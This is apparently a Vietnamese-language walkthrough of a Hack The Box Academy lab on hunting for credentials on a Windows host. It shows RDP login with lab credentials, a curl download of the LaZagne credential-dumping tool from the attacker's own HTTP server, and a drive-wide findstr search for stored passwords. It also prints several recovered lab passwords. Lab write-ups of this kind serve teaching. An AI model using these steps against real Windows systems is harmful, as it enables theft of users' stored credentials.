![image](https://github.com/user-attachments/assets/17378cbf-675b-486d-86a8-daa8055b5184)<h1>Credential Hunting in Windows</h1>

![image](https://github.com/user-attachments/assets/5527805b-4c79-45c5-9ac4-2eaa038d33da)

![image](https://github.com/user-attachments/assets/150c597e-7f3a-41a3-9580-3ae95c423372)

Dùng `xfreerdp /u:'Bob' /p:'HTB_@cademy_stdnt!' /v:10.129.171.96` để rdp vào target:

![image](https://github.com/user-attachments/assets/f9981bed-90f4-4696-ab43-adb67fb18c46)

Không có kết nối internet nên không tải được [LaZagne](https://github.com/AlessandroZ/LaZagne) về máy:

![image](https://github.com/user-attachments/assets/ea0c3a9b-419c-43da-bc9a-fcfdcc88c96d)

Nhưng mà tôi lại tìm được bwilliamson:P@55w0rd! và admin:WellConnected123 :

![image](https://github.com/user-attachments/assets/724d4918-ce33-4336-9650-d3f225ca109b)

![image](https://github.com/user-attachments/assets/560096d9-22d5-4da8-bb6e-e76582d2c051)

Và tôi tìm thêm được cái gitlab vì đề có hỏi code gitlab nữa:

![image](https://github.com/user-attachments/assets/5892f1c8-0c66-4663-9288-55ebe445afd6)

![image](https://github.com/user-attachments/assets/d84de721-2c30-4406-a09a-eaa21f087f65)

![image](https://github.com/user-attachments/assets/9665ffd9-1560-42a2-ab05-4f9c171cae9e)

Tiếp đó tôi bật cái http lên `python3 -m http.server 8888` vầ chạy `curl http://10.10.14.105/LaZagne.exe -o LaZagne.exe` trên máy target:

![image](https://github.com/user-attachments/assets/d0a3d998-c41a-4c87-b2ab-3e6fdc3bfaf7)

![image](https://github.com/user-attachments/assets/cb9cbae5-d6ba-4d20-b23f-a4aa5c120ea2)

Và thêm cái ubuntu:FSadmin123 nữa:

![image](https://github.com/user-attachments/assets/7bac07e2-1970-4ad2-b277-be653a173550)

![image](https://github.com/user-attachments/assets/257e94e7-50ae-4d3f-963c-a591b0ae9625)

Tiếp theo thì tôi cd ra C:\ và chạy `findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml` vì nếu ở im trong system32 thì kết quả sẽ ra khá ít:

![image](https://github.com/user-attachments/assets/847873aa-dc18-4496-9f6b-b859d60cfe68)

Đang lọ mọ tìm cách mở file kia thì vào vscode thấy pass của câu tiếp:

![image](https://github.com/user-attachments/assets/4db8935f-d1d0-412e-8c9a-c4d30d0d170e)

![image](https://github.com/user-attachments/assets/c9ed7b61-0aee-4ad3-916e-115bdfb50a24)

Và mật khẩu mặc định là đây:

![image](https://github.com/user-attachments/assets/7257d9ab-f60f-4148-94f7-e03c4cfbf49c)

![image](https://github.com/user-attachments/assets/8fa5d4c9-9243-45a7-921b-392ed8bbef29)
